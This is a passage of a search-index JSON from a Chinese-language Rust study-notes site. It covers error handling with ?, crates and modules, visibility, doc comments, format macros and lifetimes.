Err \u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8f6c\u6362\u9519\u8bef\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a fn func () -> Result < File , Box < dyn std :: error :: Error >> { let mut f = File :: open ( \"test.txt\" ) ? ; Ok ( f ) } \u5728 ? \u5904\u7406\u8fd4\u56de\u9519\u8bef\u7684\u65f6\u5019\uff0c\u5f97\u5230\u7684\u662f std::io::Error \u7c7b\u578b\uff0c? \u53ef\u4ee5\u81ea\u52a8\u8c03\u7528 From trait \u7684 from \u65b9\u6cd5\uff0c\u5c06 std::io::Error \u8f6c\u4e3a\u9700\u8981\u7684 Box<dyn std::error::Error> ? \u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff1a fn func () -> Result < String , std :: io :: Error > { let mut s = String :: new (); File :: open ( \"test.txt\" ) ? . read_to_string ( & mut s ) ? ; Ok ( s ) } \u5bf9\u4e8e\u8fd9\u4e2a\u64cd\u4f5c\uff0cRust \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86 std::fs::read_to_string(filename) \u51fd\u6570\uff0c\u800c\u4e14\u8fd4\u56de\u7684\u5c31\u662f Result<String, std::io::Error> ? \u7ed3\u5408 Option \u548c Result \u540c\u7406\uff0c? \u4e5f\u9002\u7528\u4e8e Option \u7684\u8fd4\u56de\uff0c\u4e5f\u5c31\u662f\u5f97\u5230 None \u5c31\u7acb\u5373\u8fd4\u56de None\uff0c\u5426\u5219\u5c55\u5f00\u51fa Some \u4e2d\u7684\u503c main \u51fd\u6570\u8fd4\u56de\u503c main \u51fd\u6570\u53ef\u4ee5\u6709\u8fd4\u56de\u503c\u7c7b\u578b Result<(), Box<dyn std::error::Error>> \u53ea\u6709\u58f0\u660e\u4e86\u8fd9\u79cd\u8fd4\u56de\u503c\u7684 main \u51fd\u6570\u4e2d\u624d\u53ef\u4ee5\u4f7f\u7528 ? \u6765\u63d0\u524d\u63a2\u6d4b\u9519\u8bef\u7ec8\u6b62 main \u51fd\u6570\uff1a use std :: error :: Error ; use std :: fs :: File ; fn main () -> Result < (), Box < dyn Error >> { let f = File :: open ( \"test.txt\" ) ? ; Ok (()) } try! \u5b8f ? \u7684\u65e9\u671f\u7248\u672c\uff0c\u907f\u514d\u4f7f\u7528 \u5b9a\u4e49\uff1a macro_rules! try { ( $e : expr ) => ( match $e { Ok ( val ) => val , Err ( err ) => return Err ( :: std :: convert :: From :: from ( err )), }); } \u4f7f\u7528\u65b9\u6cd5\uff0c\u4ee5\u4e0b\u4e24\u884c\u7b49\u4ef7\uff1a let x = func () ? ; let x = try ! ( func ());","title":"Result"},{"location":"cs/pl/rust/basic/#_48","text":"","title":"\u5305\u548c\u6a21\u5757"},{"location":"cs/pl/rust/basic/#crate-package","text":"crate \u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u53ef\u7f16\u8bd1\u5355\u5143\uff0c\u53ef\u4ee5\u7f16\u8bd1\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u4e00\u4e2a\u5e93 package \u662f cargo \u521b\u5efa\u7684\u5305\u542b Cargo.toml \u7684\u201c\u9879\u76ee\u201d\uff0c\u53ef\u4ee5\u5305\u542b\u56e0\u4e3a\u529f\u80fd\u6027\u88ab\u7ec4\u7ec7\u5728\u4e00\u8d77\u7684\u4e00\u4e2a crate \u6216\u591a\u4e2a crate \u4e00\u4e2a package \u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u5e93\uff08library\uff09\u7c7b\u578b\u7684 crate\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u4e8c\u8fdb\u5236\u7c7b\u578b\u7684 crate cargo new \u9ed8\u8ba4\u521b\u5efa\u7684\u5c31\u662f\u4e8c\u8fdb\u5236 package src/main.rs \u662f\u4e8c\u8fdb\u5236 crate \u7684\u6839\u6587\u4ef6\uff0c\u5176\u5305\u540d\u548c\u6240\u5c5e package \u76f8\u540c\uff0c\u5165\u53e3\u70b9\u5728 main \u51fd\u6570 cargo new < name > --lib \u521b\u5efa\u5e93 package \u5e93 package \u53ea\u80fd\u4f5c\u4e3a\u7b2c\u4e09\u65b9\u5e93\u88ab\u5f15\u7528\uff0c\u4e0d\u80fd\u4f7f\u7528 cargo run \u8fd0\u884c src/lib.rs \u662f\u5e93\u7c7b\u578b\u540c\u540d crate \u7684\u6839\u6587\u4ef6","title":"crate \u4e0e package"},{"location":"cs/pl/rust/basic/#package","text":". \u251c\u2500\u2500 Cargo.toml \u251c\u2500\u2500 Cargo.lock \u251c\u2500\u2500 src \u2502 \u251c\u2500\u2500 main.rs // \u9ed8\u8ba4\u4e8c\u8fdb\u5236 crate\uff08\u7f16\u8bd1\u751f\u6210 package \u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09 \u2502 \u251c\u2500\u2500 lib.rs // \u552f\u4e00\u5e93 crate \u2502 \u2514\u2500\u2500 bin // \u5176\u4f59\u4e8c\u8fdb\u5236 crate\uff08\u5206\u522b\u751f\u6210\u6587\u4ef6\u540d\u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09 \u2502 \u2514\u2500\u2500 main1.rs \u2502 \u2514\u2500\u2500 main2.rs \u251c\u2500\u2500 tests // \u96c6\u6210\u6d4b\u8bd5 \u2502 \u2514\u2500\u2500 some_integration_tests.rs \u251c\u2500\u2500 benches // \u57fa\u51c6\u6027\u80fd\u6d4b\u8bd5 benchmark \u6587\u4ef6 \u2502 \u2514\u2500\u2500 simple_bench.rs \u2514\u2500\u2500 examples // \u793a\u4f8b \u2514\u2500\u2500 simple_example.rs","title":"\u5178\u578b package \u7ed3\u6784"},{"location":"cs/pl/rust/basic/#module","text":"\u5728 lib.rs \u4e2d\u4f7f\u7528 mod \u5173\u952e\u5b57\u521b\u5efa\u6a21\u5757\uff0c\u540e\u63a5\u6a21\u5757\u540d mod \u53ef\u4ee5\u5d4c\u5957\uff0c\u6a21\u5757\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u5404\u79cd rust \u7c7b\u578b src/main.rs \u548c src/lib.rs \u79f0\u4e3a crate root \u6a21\u5757\u4f7f\u7528 :: \u9010\u7ea7\u8bbf\u95ee crate \u6307\u6839\uff0c\u4f7f\u7528 crate \u4e5f\u5c31\u76f8\u5f53\u4e8e\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84 super \u6307\u7236\u6a21\u5757\uff08\u4e0a\u4e00\u7ea7\uff09\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684 .. self \u6307\u81ea\u8eab\u6a21\u5757 \u5982\u4e0b lib.rs\uff1a mod A { mod B { fn func_a () { self :: func_b (); } fn func_b () { super :: C :: func_c (); } } mod C { fn func_c () {} } } pub fn func () { crate :: A :: B :: func_a (); // \u7edd\u5bf9\u8def\u5f84\u5f15\u7528 A :: B :: func_b (); // \u76f8\u5bf9\u8def\u5f84\u5f15\u7528 self :: A :: C :: func_c (); } \u5b83\u7684\u6a21\u5757\u6811\u4e3a\uff1a crate \u251c\u2500\u2500 func \u2514\u2500\u2500 A \u251c\u2500\u2500 B \u2502 \u251c\u2500\u2500 func_a \u2502 \u2514\u2500\u2500 func_b \u2514\u2500\u2500 C \u2514\u2500\u2500 func_c \u4ec5\u4f7f\u7528 mod name ; \u5c06\u521b\u5efa\u4e00\u4e2a\u6a21\u5757\uff0c\u5e76\u4ece\u540c\u76ee\u5f55\u4e0b\u540c\u540d\u7684 name .rs \u4e2d\u52a0\u8f7d\u6a21\u5757\u5185\u5bb9","title":"\u6a21\u5757 Module"},{"location":"cs/pl/rust/basic/#_49","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709\u7c7b\u578b\uff08\u51fd\u6570\u3001\u65b9\u6cd5\u3001\u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u2026\u2026\uff09\u90fd\u662f\u79c1\u6709\u7684 \u7236\u6a21\u5757\u65e0\u6cd5\u8bbf\u95ee\u5b50\u6a21\u5757\u4e2d\u7684\u79c1\u6709\u9879\uff0c\u800c\u5b50\u6a21\u5757\u53ef\u4ee5\u8bbf\u95ee\u7236\u6a21\u5757\u53ca\u66f4\u4e0a\u5c42\u7684\u6a21\u5757\u7684\u79c1\u6709\u9879 \u4f7f\u7528 pub \u5173\u952e\u5b57\u5c06\u6a21\u5757\u3001\u51fd\u6570\u7b49\u6807\u4e3a\u5bf9\u5916\u53ef\u89c1\u7684 \u7ed3\u6784\u4f53\u4e0e\u679a\u4e3e\u7684\u53ef\u89c1\u6027 \u4ec5\u5c06\u7ed3\u6784\u4f53\u8bbe\u7f6e\u4e3a pub\uff0c\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u4ecd\u7136\u662f\u79c1\u6709\u7684 \u4ec5\u5c06\u679a\u4e3e\u8bbe\u7f6e\u4e3a pub\uff0c\u5219\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u90fd\u5bf9\u5916\u53ef\u89c1","title":"\u4ee3\u7801\u53ef\u89c1\u6027"},{"location":"cs/pl/rust/basic/#use","text":"\u4f7f\u7528 use \u5173\u952e\u5b57\u6765\u5f15\u5165\u6a21\u5757\u6216\u7c7b\u578b\uff0c\u6765\u7b80\u5316\u8c03\u7528 \u8981\u907f\u514d\u540c\u540d\u8c03\u7528 \u4f7f\u7528 as \u6765\u8bbe\u7f6e\u522b\u540d\u89e3\u51b3\u51b2\u7a81\u95ee\u9898\uff0c\u4f8b\u5982\uff1a use std :: fmt :: Result ; use std :: io :: Result as IoResult ; \u5229\u7528 use \u5bfc\u51fa\uff0c\u5982\uff1a mod A { pub mod B { pub fn func_b () {} } } pub use crate :: A :: B ; pub fn func () { B :: func_b (); } \u4ece\u5916\u90e8\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 B \u6a21\u5757 \u53ef\u4ee5\u4f7f\u7528 {} \u6765\u7b80\u5316 use std :: collections :: { HashMap , BTreeMap , HashSet }; use std :: { cmp :: Ordering , io }; {} \u4e2d\u53ef\u4ee5\u4f7f\u7528 self\uff1a use std :: io :: { self , Write } // \u5373 use std::io \u4ee5\u53ca use std::io::Write \u4f7f\u7528 * \u5f15\u5165\u6a21\u5757\u4e0b\u6240\u6709\u516c\u5f00\u9879\uff0c\u5982 use std :: collections :: * ; \uff0c\u4f46\u8981\u5c0f\u5fc3\u540d\u79f0\u51b2\u7a81","title":"use \u5f15\u5165"},{"location":"cs/pl/rust/basic/#_50","text":"\u4f8b\u5982\u4f7f\u7528 rand \u5305\uff1a \u4fee\u6539 Cargo.toml\uff0c\u5728 [dependencies] \u4e2d\u6dfb\u52a0 rand = \"0.8.3\" \u5728\u4ee3\u7801\u4e2d\u4f7f\u7528 rand::... \u5373\u53ef use rand :: Rng ; // trait fn main () { let n = rand :: thread_rng (). gen_range ( 1 .. 101 ); } \u53ef\u4ee5\u5728 crates.io \u6216 lib.rs \u4e2d\u68c0\u7d22\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305","title":"\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305"},{"location":"cs/pl/rust/basic/#_51","text":"pub \u8868\u793a\u65e0\u4efb\u4f55\u9650\u5236\u7684\u5b8c\u5168\u53ef\u89c1 pub ( crate ) \u8868\u793a\u5728\u5f53\u524d\u5305\u5185\u53ef\u89c1 pub ( self ) \u8868\u793a\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u53ef\u89c1 pub ( super ) \u8868\u793a\u5728\u7236\u6a21\u5757\u4e2d\u53ef\u89c1 pub ( in < path > ) \u8868\u793a\u5728 <path> \u4ee3\u8868\u7684\u6a21\u5757\u4e2d\u53ef\u89c1","title":"\u53d7\u9650\u53ef\u89c1\u6027"},{"location":"cs/pl/rust/basic/#_52","text":"Rust 2015 . \u251c\u2500\u2500 lib.rs \u2514\u2500\u2500 foo/ \u251c\u2500\u2500 mod.rs \u2514\u2500\u2500 bar.rs lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo/mod.rs \u4e2d\u5185\u5bb9 \u9700\u8981\u5728 foo/mod.rs \u4e2d\u7ee7\u7eed\u4e3a bar.rs \u521b\u5efa\u540c\u540d mod Rust 2018 . \u251c\u2500\u2500 lib.rs \u251c\u2500\u2500 foo.rs \u2514\u2500\u2500 foo/ \u2514\u2500\u2500 bar.rs lib.rs \u4e2d mod foo; \u4f1a\u5f15\u5165 foo.rs \u5728 foo.rs \u4e2d mod bar; \u4e0e 2015 \u7684\u6a21\u5f0f\u76f8\u6bd4\u5c31\u76f8\u5f53\u4e8e\u5c06 mod.rs \u63d0\u5230\u6587\u4ef6\u5939\u5916\u7684\u540c\u540d\u6587\u4ef6\u4e86 \u4f7f\u7528 #[path = ...] \u521b\u5efa\u6a21\u5757\uff08\u614e\u7528\uff09 . \u251c\u2500\u2500 lib.rs \u2514\u2500\u2500 pkg/ // \u4efb\u610f \u251c\u2500\u2500 foo.rs \u2514\u2500\u2500 bar.rs lib.rs \u4e2d\u5728 mod foo; \u524d\u6307\u5b9a\u8def\u5f84\uff1a #[path = \"./pkg/foo.rs\" ] pub mod foo ; #[path = \"./pkg/bar.rs\" ] pub mod bar ;","title":"\u4e09\u79cd\u6a21\u5757\u76ee\u5f55\u7ec4\u7ec7\u65b9\u5f0f"},{"location":"cs/pl/rust/basic/#_53","text":"Rust \u4e2d\u6ce8\u91ca\u5206\u4e3a\u4e24\u7c7b\uff1a \u4ee3\u7801\u6ce8\u91ca\uff1a\u8bf4\u660e\u67d0\u4e00\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\uff08// \u884c\u6ce8\u91ca\u548c /* ... */ \u5757\u6ce8\u91ca\uff09 \u6587\u6863\u6ce8\u91ca\uff1a\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u63cf\u8ff0\u9879\u76ee\u3001\u4ecb\u7ecd\u529f\u80fd\u3001\u751f\u6210\u6587\u6863 \u5305\u548c\u6a21\u5757\u6ce8\u91ca\uff1a\u8bf4\u660e\u5f53\u524d\u5305\u548c\u6a21\u5757\u7684\u529f\u80fd","title":"\u6ce8\u91ca\u4e0e\u6587\u6863"},{"location":"cs/pl/rust/basic/#_54","text":"\u6587\u6863\u884c\u6ce8\u91ca /// \u4e0e\u6587\u6863\u5757\u6ce8\u91ca /** ... */ \u6587\u6863\u6ce8\u91ca\u9700\u8981\u4f4d\u4e8e\u5e93\u7c7b\u578b\u7684 crate \u4e2d \u53ef\u4ee5\u4f7f\u7528 markdown \u8bed\u6cd5\uff0c\u4ee5\u53ca\u4ee3\u7801\u5757\u9ad8\u4eae\u663e\u793a \u5199\u5728\u88ab\u6ce8\u91ca\u7c7b\u578b\u4e0a\u65b9 \u88ab\u6ce8\u91ca\u7684\u5bf9\u8c61\u9700\u8981 pub \u5bf9\u5916\u53ef\u89c1 \u6587\u6863\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u591a\u4e2a\u4e00\u7ea7\u6807\u9898\uff0c\u5e38\u7528\u7684\u6709 # Examples # Panics\uff1a\u63cf\u8ff0\u51fd\u6570\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684 panic \u60c5\u51b5 # Errors\uff1a\u63cf\u8ff0\u53ef\u80fd\u4f1a\u51fa\u73b0\u7684\u9519\u8bef\u4ee5\u53ca\u89e6\u53d1\u60c5\u51b5 # Safety\uff1aunsafe \u4ee3\u7801\u9700\u8981\u6ce8\u610f\u7684\u4f7f\u7528\u6761\u4ef6 \u5305/\u6a21\u5757\u7ea7\u522b\u884c\u6ce8\u91ca //! \u4e0e\u5305/\u6a21\u5757\u7ea7\u522b\u5757\u6ce8\u91ca /*! ... */ \u5199\u5728 crate root \u7684\u6700\u4e0a\u65b9 \u4f7f\u7528 cargo doc \u6784\u5efa\u6587\u6863\uff0c\u751f\u6210\u5728 target/doc \u76ee\u5f55\u4e0b \u4f7f\u7528 cargo doc --open \u6784\u5efa\u5e76\u6253\u5f00 \u6587\u6863\u6d4b\u8bd5 \u6587\u6863\u6ce8\u91ca\u4e2d\u7684\u4ee3\u7801\u5757\u53ef\u4ee5\u7528\u4f5c\u6d4b\u8bd5\uff0c\u76f4\u63a5\u5199 assert \u7b49\u5b8f\u5c31\u53ef\u4ee5 \u4f7f\u7528 cargo test \u4f1a\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5e76\u663e\u793a \"Doc-tests ...\" \u9884\u671f\u4f1a\u9020\u6210 panic \u7b49\u4ee3\u7801\u5757\u9700\u8981\u5728\u4ee3\u7801\u5757\u8bed\u8a00\u540e\u52a0\u4e0a should_panic\uff1a /// # Panics /// /// ```rust,should_panic /// ... /// ``` \u4ec5\u6d4b\u8bd5\uff0c\u4e0d\u663e\u793a\u5728\u6587\u6863\u4e2d\u7684\u884c\u5f00\u5934\u52a0 # \u5c31\u53ef\u4ee5\uff1a /// ``` /// # fn try_main() -> Result<(), String> { /// let res = ...::func()?; /// # Ok(()) /// # } /// # fn main() { /// # try_main().unwrap(); /// # } \u5982\u4e0a\u8ff0\u4f8b\u5b50\uff0c\u6700\u7ec8\u5728\u6587\u6863\u4e2d\u53ea\u4f1a\u663e\u793a let \u90a3\u4e00\u884c\uff0c\u4f46\u5728\u8fdb\u884c doc-test \u65f6\u5168\u90e8\u4ee3\u7801\u90fd\u4f1a\u8fd0\u884c \u4ee3\u7801\u8df3\u8f6c\uff08\u81ea\u52a8\u94fe\u63a5\uff09 \u6587\u6863\u4e2d\u5199 [`Option`] \u4f1a\u5728\u6587\u6863\u4e2d\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u6807\u51c6\u5e93\u4e2d Option \u7c7b\u578b\u7684\u94fe\u63a5 \u4e5f\u53ef\u4ee5\u6307\u5b9a\u5177\u4f53\u7684\u8def\u5f84\u6765\u521b\u5efa\u6307\u5411\u81ea\u5df1\u4ee3\u7801\u6216\u5176\u5b83\u5e93\u4e2d\u6307\u5b9a\u9879\u7684\u94fe\u63a5 \u540c\u540d\u9879\u53ef\u4ee5\u6807\u793a\u7c7b\u578b\uff1a /// \u8df3\u8f6c\u5230\u7ed3\u6784\u4f53 [`Foo`](struct@Foo) pub struct Bar ; /// \u8df3\u8f6c\u5230\u540c\u540d\u51fd\u6570 [`Foo`](fn@Foo) pub struct Foo {} /// \u8df3\u8f6c\u5230\u540c\u540d\u5b8f [`foo!`] pub fn Foo () {} #[macro_export] macro_rules! foo { () => {} } \u6587\u6863\u641c\u7d22\u522b\u540d #[doc(alias = \"x\" )] #[doc(alias = \"big\" )] pub struct BigX ; #[doc(alias( \"y\" , \"big\" ))] pub struct BigY ; \u5982\u4e0a\u4ee3\u7801\uff0c\u5728\u6587\u6863\u4e2d\u641c\u7d22\u7684\u65f6\u5019\uff0c\u641c\u7d22 x \u5c31\u4f1a\u547d\u4e2d BigX","title":"\u6587\u6863\u6ce8\u91ca"},{"location":"cs/pl/rust/basic/#_55","text":"Rust \u7684\u683c\u5f0f\u5316\u5c31\u6bd4\u8f83\u7c7b\u4f3c\u4e8e python \u7684 format \u4e86 \u683c\u5f0f\u5316\u5b8f print!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u4e0d\u6362\u884c println!\uff1a\u683c\u5f0f\u5316\u6587\u672c\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u6362\u884c format!\uff1a\u683c\u5f0f\u5316\u6587\u672c\uff0c\u8fd4\u56de String eprint! \u4e0e eprintln!\uff1a\u683c\u5f0f\u5316\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa \u5360\u4f4d\u7b26 {} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Display trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u5c55\u793a\u7ed9\u7528\u6237 {:?} \u9002\u7528\u4e8e\u5b9e\u73b0\u4e86 std::fmt::Debug trait \u7684\u7c7b\u578b\uff0c\u7528\u4e8e\u8c03\u8bd5 {:#?} \u540c\u4e0a\uff0c\u4e0d\u8fc7\u663e\u793a\u66f4\u4f18\u7f8e\uff08\u81ea\u52a8\u6362\u884c\u4e00\u7c7b\uff09 \u5b9e\u73b0 Display trait use std :: fmt ; impl fmt :: Display for .. . { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"...{}...\" , .. .) } } \u53ea\u80fd\u4e3a\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0 Display trait \u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0 Display \u53ef\u4ee5\u4f7f\u7528 newtype \u6a21\u5f0f \u4f4d\u7f6e\u53c2\u6570 fn main () { println! ( \"{}{}\" , 1 , 2 ); // =>\"12\" println! ( \"{1}{0}\" , 1 , 2 ); // =>\"21\" // => Alice, this is Bob. Bob, this is Alice println! ( \"{0}, this is {1}. {1}, this is {0}\" , \"Alice\" , \"Bob\" ); println! ( \"{1}{}{0}{}\" , 1 , 2 ); // => 2112 } \u5bf9\u4e8e {:?} \u6216 {:#?}\uff0c\u5c06\u4f4d\u7f6e\u53c2\u6570\u52a0\u5728\u5192\u53f7\u524d\u5c31\u53ef\u4ee5 \u5177\u540d\u53c2\u6570 fn main () { println! ( \"{argument}\" , argument = \"test\" ); // => \"test\" println! ( \"{name} {}\" , 1 , name = 2 ); // => \"2 1\" println! ( \"{a} {c} {b}\" , a = \"a\" , b = 'b' , c = 3 ); // => \"a 3 b\" } \u5e26\u540d\u79f0\u7684\u53c2\u6570\u53ea\u80fd\u653e\u5728\u4e0d\u5e26\u540d\u79f0\u7684\u540e\u9762 \u683c\u5f0f\u5316\u53c2\u6570 \u5bbd\u5ea6\u586b\u5145 \u5b57\u7b26\u4e32 //----------------------------------- // \u4ee5\u4e0b\u5168\u90e8\u8f93\u51fa \"Hello x !\" // \u4e3a\"x\"\u540e\u9762\u586b\u5145\u7a7a\u683c\uff0c\u8865\u9f50\u5bbd\u5ea65 println! ( \"Hello {:5}!\" , \"x\" ); // \u4f7f\u7528\u53c2\u65705\u6765\u6307\u5b9a\u5bbd\u5ea6 println! ( \"Hello {:1$}!\" , \"x\" , 5 ); // \u4f7f\u7528x\u4f5c\u4e3a\u5360\u4f4d\u7b26\u8f93\u51fa\u5185\u5bb9\uff0c\u540c\u65f6\u4f7f\u75285\u4f5c\u4e3a\u5bbd\u5ea6 println! ( \"Hello {1:0$}!\" , 5 , \"x\" ); // \u4f7f\u7528\u6709\u540d\u79f0\u7684\u53c2\u6570\u4f5c\u4e3a\u5bbd\u5ea6 println! ( \"Hello {:width$}!\" , \"x\" , width = 5 ); //----------------------------------- // \u4f7f\u7528\u53c2\u65705\u4e3a\u53c2\u6570x\u6307\u5b9a\u5bbd\u5ea6\uff0c\u540c\u65f6\u5728\u7ed3\u5c3e\u8f93\u51fa\u53c2\u65705 => Hello x !5 println! ( \"Hello {:1$}!{}\" , \"x\" , 5 ); \u6570\u5b57 // \u5bbd\u5ea6\u662f5 => Hello 5! println! ( \"Hello {:5}!\" , 5 ); // \u663e\u5f0f\u7684\u8f93\u51fa\u6b63\u53f7 => Hello +5! println! ( \"Hello {:+}!\" , 5 ); // \u5bbd\u5ea65\uff0c\u4f7f\u75280\u8fdb\u884c\u586b\u5145 => Hello 00005! println! ( \"Hello {:05}!\" , 5 ); // \u8d1f\u53f7\u4e5f\u8981\u5360\u7528\u4e00\u4f4d\u5bbd\u5ea6 => Hello -0005! println! ( \"Hello {:05}!\" , - 5 ); \u5bf9\u9f50 // \u4ee5\u4e0b\u5168\u90e8\u90fd\u4f1a\u8865\u9f505\u4e2a\u5b57\u7b26\u7684\u957f\u5ea6 // \u5de6\u5bf9\u9f50 => Hello x ! println! ( \"Hello {:<5}!\" , \"x\" ); // \u53f3\u5bf9\u9f50 => Hello x! println! ( \"Hello {:>5}!\" , \"x\" ); // \u5c45\u4e2d\u5bf9\u9f50 => Hello x ! println! ( \"Hello {:^5}!\" , \"x\" ); // \u5bf9\u9f50\u5e76\u4f7f\u7528\u6307\u5b9a\u7b26\u53f7\u586b\u5145 => Hello x&&&&! // \u6307\u5b9a\u7b26\u53f7\u586b\u5145\u7684\u524d\u63d0\u6761\u4ef6\u662f\u5fc5\u987b\u6709\u5bf9\u9f50\u5b57\u7b26 println! ( \"Hello {:&<5}!\" , \"x\" ); \u7cbe\u5ea6 let v = 3.1415926 ; // \u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d => 3.14 println! ( \"{:.2}\" , v ); // \u5e26\u7b26\u53f7\u4fdd\u7559\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d => +3.14 println! ( \"{:+.2}\" , v ); // \u4e0d\u5e26\u5c0f\u6570 => 3 println! ( \"{:.0}\" , v ); // \u901a\u8fc7\u53c2\u6570\u6765\u8bbe\u5b9a\u7cbe\u5ea6 => 3.1416\uff0c\u76f8\u5f53\u4e8e{:.4} println! ( \"{:.1$}\" , v , 4 ); let s = \"abcded\" ; // \u4fdd\u7559\u5b57\u7b26\u4e32\u524d\u4e09\u4e2a\u5b57\u7b26 => abc println! ( \"{:.3}\" , s ); // {:.*}\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u7cbe\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u662f\u88ab\u683c\u5f0f\u5316\u7684\u503c => Hello abc! println! ( \"Hello {:.*}!\" , 3 , \"abcdefg\" ); \u8fdb\u5236 // \u4e8c\u8fdb\u5236 => 0b11011! println! ( \"{:#b}!\" , 27 ); // \u516b\u8fdb\u5236 => 0o33! println! ( \"{:#o}!\" , 27 ); // \u5341\u8fdb\u5236 => 27! println! ( \"{}!\" , 27 ); // \u5c0f\u5199\u5341\u516d\u8fdb\u5236 => 0x1b! println! ( \"{:#x}!\" , 27 ); // \u5927\u5199\u5341\u516d\u8fdb\u5236 => 0x1B! println! ( \"{:#X}!\" , 27 ); // \u4e0d\u5e26\u524d\u7f00\u7684\u5341\u516d\u8fdb\u5236 => 1b! println! ( \"{:x}!\" , 27 ); // \u4f7f\u75280\u586b\u5145\u4e8c\u8fdb\u5236\uff0c\u5bbd\u5ea6\u4e3a10 => 0b00011011! println! ( \"{:#010b}!\" , 27 ); \u6307\u6570 println! ( \"{:2e}\" , 1000000000 ); // => 1e9 println! ( \"{:2E}\" , 1000000000 ); // => 1E9 \u6307\u9488\u5730\u5740 let v = vec! [ 1 , 2 , 3 ]; println! ( \"{:p}\" , v . as_ptr ()) // => 0x600002324050 \u8f93\u51fa { \u6216 } \u8981\u5199\u4e24\u6b21\u8fdb\u884c\u8f6c\u4e49 1.58 \u4e2d\u65b0\u589e\u6355\u83b7\u73af\u5883\u503c \u7c7b\u4f3c python \u4e2d\u7684 f-string\uff0c\u4e0d\u8fc7\u4e0d\u9700\u8981\u7279\u6b8a\u6807\u6ce8 \u6355\u83b7\u53d8\u91cf\u53ef\u4ee5\u66ff\u6362\u5728\u4efb\u4f55\u4f4d\u7f6e let ( width , precision ) = get_format (); for ( name , score ) in get_scores () { println! ( \"{name}: {score:width$.precision$}\" ); } panic! \u5728 2021 \u7248\u672c\u4e0b\u624d\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528","title":"\u683c\u5f0f\u5316\u8f93\u51fa"},{"location":"cs/pl/rust/basic/#_56","text":"\u5b58\u5728\u591a\u4e2a\u5f15\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u6709\u65f6\u4f1a\u65e0\u6cd5\u81ea\u52a8\u63a8\u5bfc\u751f\u547d\u5468\u671f\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8 \u751f\u547d\u5468\u671f\u662f\u4e3a\u7f16\u8bd1\u5668\u800c\u6807\u6ce8\uff0c\u5e76\u4e0d\u4f1a\u6539\u53d8\u4efb\u4f55\u5f15\u7528\u7684\u5b9e\u9645\u4f5c\u7528\u57df \u751f\u547d\u5468\u671f\u4ee5 ' \u5f00\u5934\uff0c\u540d\u79f0\u5f80\u5f80\u662f\u5355\u72ec\u7684\u5c0f\u5199\u5b57\u6bcd\uff08\u5982 ' a \uff09 & i32 // i32 \u7c7b\u578b\u7684\u5f15\u7528 &' a i32 // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u5f15\u7528 &' a mut i32 // \u5e26\u6709\u663e\u793a\u751f\u547d\u5468\u671f 'a \u7684 i32 \u53ef\u53d8\u5f15\u7528 \u51fd\u6570\u7b7e\u540d\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u9700\u8981\u5148\u50cf\u6cdb\u578b\u4e00\u6837\u58f0\u660e fn func <' a > ( x : & ' a str , y : & ' a str ) -> & ' a str {} \u8868\u793a\u4e24\u4e2a\u53c2\u6570\u4ee5\u53ca\u8fd4\u56de\u5f15\u7528\u81f3\u5c11\u548c 'a \u6d3b\u5f97\u4e00\u6837\u4e45 \u4e24\u4e2a\u53c2\u6570\u7684\u771f\u5b9e\u751f\u547d\u5468\u671f\u53ef\u80fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u53ea\u9700\u8981\u4e0d\u5c0f\u4e8e 'a \u5c31\u53ef\u4ee5 \u8c03\u7528\u7684\u65f6\u5019\u4e0d\u5fc5\u6807\u6ce8\u751f\u547d\u5468\u671f 